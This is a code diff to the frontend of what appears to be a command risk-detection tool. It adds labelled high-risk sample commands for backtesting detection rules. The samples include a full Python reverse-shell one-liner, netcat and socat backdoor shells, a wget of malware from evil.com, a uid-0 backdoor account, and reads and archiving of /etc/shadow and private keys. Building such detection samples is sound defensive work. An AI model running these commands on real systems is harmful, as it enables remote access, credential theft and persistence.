@@ -973,6 +973,28 @@ const highRiskPresets = [
   { comm: 'wget', args: 'http://evil.com/malware -O /tmp/x', label: 'BLOCK', desc: '下载恶意文件' },
   { comm: 'chown', args: 'root:root /etc/shadow', label: 'ALERT', desc: '修改敏感文件所有者' },
   { comm: 'mount', args: '-t cifs //evil/share /mnt', label: 'ALERT', desc: '挂载远程文件系统' },
+  // Network security (6)
+  { comm: 'tcpdump', args: '-i any -w /tmp/capture.pcap', label: 'ALERT', desc: '网络嗅探' },
+  { comm: 'nmap', args: '-sS 192.168.1.0/24', label: 'BLOCK', desc: '端口扫描' },
+  { comm: 'nc', args: '-lvp 4444', label: 'BLOCK', desc: '监听后门端口' },
+  { comm: 'ssh', args: '-D 1080 user@evil.com', label: 'ALERT', desc: 'SSH 动态隧道' },
+  { comm: 'python3', args: '-c "import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"', label: 'BLOCK', desc: 'Python 反向 shell' },
+  { comm: 'socat', args: 'TCP-LISTEN:5555,fork EXEC:/bin/bash', label: 'BLOCK', desc: 'Socat 后门' },
+  // System modification (4)
+  { comm: 'crontab', args: '-e', label: 'ALERT', desc: '修改计划任务' },
+  { comm: 'modprobe', args: 'evil_module', label: 'BLOCK', desc: '加载内核模块' },
+  { comm: 'systemctl', args: 'disable firewalld', label: 'ALERT', desc: '禁用防火墙服务' },
+  { comm: 'useradd', args: '-o -u 0 -g 0 backdoor', label: 'BLOCK', desc: '创建 root 后门账户' },
+  // Sensitive files (4)
+  { comm: 'cat', args: '/etc/shadow', label: 'ALERT', desc: '读取密码哈希文件' },
+  { comm: 'find', args: '/ -name "*.pem" -o -name "id_rsa"', label: 'ALERT', desc: '搜索私钥文件' },
+  { comm: 'grep', args: '-r password /etc/', label: 'ALERT', desc: '递归搜索密码字段' },
+  { comm: 'tar', args: 'czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow', label: 'BLOCK', desc: '打包敏感文件外泄' },
+  // Process manipulation (4)
+  { comm: 'strace', args: '-p 1 -f', label: 'ALERT', desc: '跟踪 init 进程系统调用' },
+  { comm: 'gdb', args: '-p 1', label: 'ALERT', desc: '调试 init 进程' },
+  { comm: 'kill', args: '-9 1', label: 'BLOCK', desc: '强制终止 init 进程' },
+  { comm: 'chroot', args: '/tmp /bin/bash', label: 'ALERT', desc: '切换根目录逃逸' },
 ];
 
 const submitManualSample = async () => {
@@ -1930,7 +1952,7 @@ onMounted(async () => {
                     </a-radio-group>
                   </div>
                   <div style="background: #fffbe6; border: 1px solid #ffe58f; border-radius: 4px; padding: 6px 10px; margin-bottom: 8px; font-size: 13px" v-if="sampleComm">
-                    <span style="color: #666">将添加: </span>
+                    <span style="color: #666">将添加：</span>
                     <strong>{{ sampleComm }}</strong>
                     <span v-if="sampleArgs" style="color: #666"> {{ sampleArgs.slice(0, 40) }}{{ sampleArgs.length > 40 ? '…' : '' }}</span>
                     <span style="color: #666"> → </span>
@@ -1962,7 +1984,7 @@ onMounted(async () => {
                     </a-button>
                   </a-space>
                   <div style="margin-top: 12px; font-size: 12px; color: #999">
-                    快速测试:
+                    快速测试：
                     <a v-for="(p, i) in highRiskPresets.slice(0, 5)" :key="i" @click="runBacktestPreset(p.comm, p.args)" style="margin-right: 8px; white-space: nowrap">{{ p.comm }}</a>
                   </div>
                 </a-col>
@@ -1973,7 +1995,7 @@ onMounted(async () => {
                     <div style="display: flex; align-items: center; gap: 16px">
                       <div style="flex: 1">
                         <div style="font-weight: 600; margin-bottom: 4px">
-                          风险评分: {{ backtestResult.riskScore?.toFixed(0) || '-' }} / 100
+                          风险评分：{{ backtestResult.riskScore?.toFixed(0) || '-' }} / 100
                           <a-tag :color="riskLevelColor(backtestResult.riskLevel)" style="margin-left: 8px">
                             {{ backtestResult.riskLevel }}
                           </a-tag>
